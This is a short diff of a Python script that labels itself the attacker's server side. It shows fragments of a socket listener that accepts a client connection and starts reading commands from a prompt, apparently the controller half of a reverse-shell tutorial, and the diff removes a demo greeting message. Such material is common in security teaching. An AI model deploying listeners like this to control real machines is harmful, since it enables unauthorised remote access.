@@ -1,6 +1,5 @@
 #!/usr/bin/env python3
 
-
 # Server Side
 # THE ATTACKer's CODE
 
@@ -24,10 +23,6 @@ print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")
 client_socket, client_address = s.accept()
 print(f"{client_address[0]}:{client_address[1]} Connected!")
 
-
-# just sending a message, for demonstration purposes
-message = "Hello and Welcome".encode()
-client_socket.send(message)
 
 while True:
     # get the command from prompt
